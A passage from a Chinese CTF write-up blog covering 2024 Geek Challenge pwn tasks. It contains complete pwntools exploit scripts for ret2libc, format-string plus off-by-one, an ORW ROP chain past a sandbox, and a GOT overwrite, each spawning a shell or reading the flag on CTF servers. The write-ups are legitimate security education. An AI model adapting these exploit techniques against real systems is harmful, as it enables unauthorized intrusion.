class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">22328</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;[3] exit.\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pop_rdi = <span class="number">0x400903</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x4005F0</span></span><br><span class="line">writesomething = <span class="number">0x400798</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(writesomething)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr-----&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = puts_addr - <span class="number">0x80970</span></span><br><span class="line">sys_addr = <span class="number">0x4F420</span>+libc</span><br><span class="line">sh_addr = <span class="number">0x1B3D88</span>+libc</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi) + p64(sh_addr) + p64(<span class="number">0x4005d6</span>)+p64(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="真能走到后门吗"><a class="markdownIt-Anchor" href="#真能走到后门吗"></a> 真能走到后门吗</h2>
<ul>
<li>不多说抽象题目，考格式化字符串漏洞，还有一个off-by-one，思路限制的非常死。</li>
<li>拿到附件先查看一下保护机制,发现金丝雀开了</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112231322875.png" alt="image-20241112231322875"></p>
<ul>
<li>然后拿到附件查看，main函数没有什么漏洞溢出点</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112231423733.png" alt="image-20241112231423733"></p>
<ul>
<li>再查看vuln函数，发现有明显的格式化字符串漏洞</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112231450876.png" alt="image-20241112231450876"></p>
<ul>
<li>然后我还注意到<code>read_str</code>存在off-by-one，会溢出一个字节</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112231537145.png" alt="image-20241112231537145"></p>
<ul>
<li>这题光看是没有用的，要动态调试才能找到利用方式，这题牢了我好几个小时，利用思路就是利用格式化字符串漏洞，修改返回地址<code>0x4013F1</code>，中的<code>0x13</code>为<code>0x12</code>，然后再使用off-by-one将<code>0xF1</code>修改为<code>0x85</code>（这里不修改为0x7D的原因是存在栈对齐，如果修改为0x7D执行后面函数时，栈不会对齐16字节）</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">36217</span>)</span><br><span class="line"><span class="comment"># nc nc1.ctfplus.cn 36217</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;tell me your ID:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;OK,whats your name?\n&#x27;</span>,<span class="string">b&#x27;%14$p,%13$p&#x27;</span>)</span><br><span class="line">v1 = p.recvline()</span><br><span class="line">v1 = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">v0 = v1[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;v0----&gt;&#x27;</span>,v0)</span><br><span class="line">v0 = <span class="built_in">int</span>(v0,<span class="number">16</span>)</span><br><span class="line">cannary = v1[<span class="number">15</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cannary---&gt;&#x27;</span>,cannary)</span><br><span class="line">cannary = <span class="built_in">int</span>(cannary,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(cannary)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v0))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>  + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(v0-<span class="number">0x18</span>+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(cannary) +p64(v0) + p8(<span class="number">0xEC</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + <span class="string">b&#x27;%1$p&#x27;</span> + <span class="string">b&#x27;%12$hhn&#x27;</span>+<span class="string">b&#x27;a&#x27;</span> + p64(v0-<span class="number">0x18</span>+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(cannary) + p64(v0) + p8(<span class="number">0xEC</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + <span class="string">b&#x27;%1$p&#x27;</span> + <span class="string">b&#x27;%12$hhn&#x27;</span>+<span class="string">b&#x27;a&#x27;</span> + p64(v0-<span class="number">0x18</span>+<span class="number">0x1</span>)</span><br><span class="line">payload += p64(cannary) + p64(v0) + p8(<span class="number">0x85</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()                     </span><br></pre></td></tr></table></figure>
<ul>
<li>图片如下：</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112231256654.png" alt="image-20241112231256654"></p>
<ul>
<li>最后得到flag<code>SYC&#123;64121dc2-6c8b-4232-877b-7d0c40c185a9&#125;</code></li>
</ul>
<h2 id="orzorw"><a class="markdownIt-Anchor" href="#orzorw"></a> orz?orw!</h2>
<ul>
<li>基础的orw题型，正常思路，没写shellcode，比较麻烦</li>
<li>拿到附件先check一下，发现没开PIE，然后开了canary。</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113224742777.png" alt="image-20241113224742777"></p>
<ul>
<li>然后再来使用IDA反编译,发现buf那边存在溢出，可以先泄露Canary，然后还可以溢出导致read，v6那边可以写入更多字节，然后导致栈溢出</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113224853136.png" alt="image-20241113224853136"></p>
<ul>
<li>同时发现有sandbox</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113224958495.png" alt="image-20241113224958495"></p>
<ul>
<li>查看一下沙箱，发现最醒目的是禁用了execve，这样我们就不能getshell，所以需要orw</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113225024261.png" alt="image-20241113225024261"></p>
<ul>
<li>这题orw使用csu这条ROP链传参。先泄露libc，得到Syscall地址，然后将Syscall地址和./flag写入bss段，然后再open，read，puts，就可以得到flag<code>SYC&#123;9f347143-9ba9-4cfc-9913-6a4d2525f8f3&#125;</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113225239896.png" alt="image-20241113225239896"></p>
<ul>
<li>exp：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">36350</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your size:\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1</span> + p8(<span class="number">255</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please input your name:\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello a\xffaaaaaaa\n&#x27;</span>)</span><br><span class="line"><span class="comment">#cannary = p.recvline()[:-1]</span></span><br><span class="line"><span class="comment">#print(cannary)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cannary = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cannary-----&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(cannary,<span class="string">&#x27;little&#x27;</span>)))</span><br><span class="line">cannary = <span class="string">b&#x27;\x00&#x27;</span> + cannary</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4014a3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4014a1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">puts_got = <span class="number">0x404028</span></span><br><span class="line">puts_plt = <span class="number">0x4010F4</span></span><br><span class="line">main_addr = <span class="number">0x401328</span></span><br><span class="line">read_plt = <span class="number">0x404048</span></span><br><span class="line">pop_rbx_rbp__r15 = <span class="number">0x40149A</span></span><br><span class="line">bss = <span class="number">0x404250</span></span><br><span class="line">call_addr = <span class="number">0x401480</span></span><br><span class="line"><span class="comment"># r12 ---&gt; rdi</span></span><br><span class="line"><span class="comment"># r13 ---&gt; rsi</span></span><br><span class="line"><span class="comment"># r14 ---&gt; rdx</span></span><br><span class="line"><span class="comment"># rbx ---&gt; 0</span></span><br><span class="line"><span class="comment"># rbp ---&gt; 1</span></span><br><span class="line"><span class="comment"># r15 ---&gt; ret_addr</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + cannary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span> + p64(pop_rdi) + p64(puts_got)</span><br><span class="line">payload1 += p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Great!now you can do what you want!\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr-------&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">#syscall_addr = puts_addr + 0x9DA20</span></span><br><span class="line">libc = puts_addr - <span class="number">0x84420</span></span><br><span class="line">syscall_addr = <span class="number">0x118940</span> + libc      </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your size:\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Please input your name:\n&#x27;</span>,payload)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + cannary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span> + p64(pop_rbx_rbp__r15)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(bss) + p64(<span class="number">0x10</span>) + p64(read_plt)</span><br><span class="line">payload2 += p64(call_addr) + p64(<span class="number">0xdeadbeff</span>)*<span class="number">7</span> + p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;give me your id\n&#x27;</span>,payload2)</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------&gt;&#x27;</span>,p64(syscall_addr))</span><br><span class="line">payload3 = p64(syscall_addr) + <span class="string">b&#x27;./flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your size:\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please input your name:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + cannary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span> + p64(pop_rbx_rbp__r15)</span><br><span class="line">payload4 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x2</span>) + p64(bss+<span class="number">0x8</span>) + p64(<span class="number">0x0</span>) + p64(bss)</span><br><span class="line">payload4 += p64(call_addr) + p64(<span class="number">0xdeadbeff</span>)*<span class="number">7</span> + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id\n&#x27;</span>,payload4)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your size:\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please input your name:\n&#x27;</span>,payload)</span><br><span class="line">payload5 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + cannary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span> + p64(pop_rbx_rbp__r15)</span><br><span class="line">payload5 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">3</span>) + p64(bss+<span class="number">0x50</span>) + p64(<span class="number">0x50</span>) + p64(read_plt)</span><br><span class="line">payload5 += p64(call_addr) + p64(<span class="number">0xdeadbeff</span>)*<span class="number">7</span> + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id\n&#x27;</span>,payload5)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your size:\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please input your name:\n&#x27;</span>,payload)</span><br><span class="line">payload6 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + cannary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x7</span> + p64(pop_rdi) + p64(bss+<span class="number">0x50</span>) + p64(puts_plt)p.sendlineafter(<span class="string">b&#x27;give me your id\n&#x27;</span>,payload6)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="findgt"><a class="markdownIt-Anchor" href="#findgt"></a> FindG???t</h2>
<ul>
<li>非常抽象的题目，不知道是不是我没对上思路还是出题人就想这么搞。</li>
<li>拿到附件先老样子，check一下</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115150436807.png" alt="image-20241115150436807"></p>
<ul>
<li>然后使用IDA打开该文件，发现这个地方可以造成溢出，首先想到的是覆盖返回值，但是只能覆盖一个字节</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115150515608.png" alt="image-20241115150515608"></p>
<ul>
<li>经过动态调试发现，覆盖返回值的一个字节（返回值刚好是<code>libc_start_main</code>），然后就可以再次执行一遍main函数的。但是这个并没有什么用处。所以继续动态调试。</li>
<li>经过动态调试发现，rax的值我们可以控制，rdi的值为v4这个字节数组的地址，而我发现，当覆盖为<code>0xb4</code>的会返回到Syscall函数（在本地调试的时候会出现该情况）</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115151416122.png" alt="image-20241115151416122"></p>
<ul>
<li>
<p>之后思路来了，在本地打通了。但是在远程可能是因为libc版本导致偏移量不同。所以就采用爆破字节的方法来得到Syscall的正确位置，从而getshell</p>
</li>
<li>
<p>exp：如下</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./FindG&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">18628</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    payload = <span class="number">0x58</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(payload).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.send(p8(<span class="number">0xe5</span>+i))</span><br><span class="line"><span class="comment"># 0x89 0xb0</span></span><br><span class="line"><span class="comment"># syscall 0xb4</span></span><br><span class="line"><span class="comment">#p.send(p8(0xb0))</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index2:&#x27;</span>,<span class="built_in">str</span>(<span class="number">59</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag\n&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
<p>flag如下：<code>flag&#123;0d05fdd8-0b94-4efd-8535-f7682567b4d5&#125;</code></p>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115150347837.png" alt="image-20241115150347837"></p>
<h2 id="stack_overflow"><a class="markdownIt-Anchor" href="#stack_overflow"></a> stack_overflow</h2>
<ul>
<li>拿到附件先查看保护机制，发现有开Canary，没有开pie，RELRO也没开，这就意味着got表可被改写</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118201702205.png" alt="image-20241118201702205"></p>
<ul>
<li>接下来使用IDA反编该可执行文件，会发现这里可以指定内存地址写入或者修改内容，但是我们指定内存地址并不能指定为末尾为<code>0x0</code>或者<code>0x8</code>的内存地址</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118202513914.png" alt="image-20241118202513914"></p>
<ul>
<li>然后又看到后面存在溢出，但是存在Canary保护</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118203513594.png" alt="image-20241118203513594"></p>
<ul>
<li>
<p>所以本题思路就是直接修改<code>__stack_chk_fail</code>函数的got表，然他返回到每次call该函数的时候就直接call到<code>000000000040137F                 leave</code></p>
</li>
<li>
<p>这样就可以绕过Canary了，但是由于不能指定修改的地址结尾为<code>0x0</code>或者<code>0x8</code>所以我指定buf为<code>0x403380-0x1</code>所以这就会导致puts的got表也被修改，之后就只能用printf函数泄露libc地址了</p>
</li>
<li>
<p>之后就是正常的ret2libc了</p>
</li>
<li>
<p>exp如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">42345</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./overflow&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;give this gift:&#x27;</span>)</span><br><span class="line">fs = p.recvline()[:<span class="number">6</span>]</span><br><span class="line">stack_chk_fail = <span class="number">0x40337e</span></span><br><span class="line"><span class="built_in">print</span>(fs)</span><br><span class="line">fs = <span class="built_in">int</span>.from_bytes(fs,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fs))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;please input *ptr:&#x27;</span>,p64(stack_chk_fail))</span><br><span class="line"><span class="comment"># de2d70</span></span><br><span class="line"><span class="comment"># 40137F</span></span><br><span class="line">payload = <span class="string">b&#x27;x\00&#x27;</span> + <span class="string">b&#x27;\x7f&#x27;</span> + <span class="string">b&#x27;\x13&#x27;</span>+ <span class="string">b&#x27;@&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p32(<span class="number">0x40137F</span>))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;change *address:&#x27;</span>,payload)</span><br><span class="line">bss_addr =  <span class="number">0x403750</span></span><br><span class="line">pop_rdi_rcx = <span class="number">0x40123f</span></span><br><span class="line">read_got = <span class="number">0x403390</span></span><br><span class="line">printf_plt = <span class="number">0x4010B4</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(bss_addr) + p64(pop_rdi_rcx) + p64(read_got)</span><br><span class="line">payload1 += p64(<span class="number">0xdeadbeff</span>) + p64(printf_plt) + p64(<span class="number">0x401350</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;buf:&#x27;</span>,payload1)</span><br><span class="line">read_addr = p.recv()</span><br><span class="line">read_addr = <span class="built_in">int</span>.from_bytes(read_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_addr = read_addr - <span class="number">0x1147D0</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x50D70</span></span><br><span class="line">sh_addr = <span class="number">0x1D8678</span>+libc_addr</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_rcx) + p64(sh_addr) +p64(<span class="number">0x0</span>)</span><br><span class="line">payload2 += p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
<ul>
<li>复现后得到flag：</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118205522440.png" alt="image-20241118205522440"></p>
<h2 id="stdout"><a class="markdownIt-Anchor" href="#stdout"></a> stdout</h2>
<ul>
<li>还是老样子，打开附件检查一下保护机制,发现开了pie，但是没有开Canary</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118204501135.png" alt="image-20241118204501135"></p>
<ul>
<li>使用IDA反编译查看一下代码，在初始化这边看到了与其他题目不同的地方，标准输出被修改成了全缓冲，而不是无缓冲模式，这就意味着要等<code>buf</code>这个缓冲区满了之后，程序才会输出出来</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118204543559.png" alt="image-20241118204543559"></p>
<ul>
<li>这里还有一个gift，可以用来泄露栈上的rbp的地址</li>
</ul>
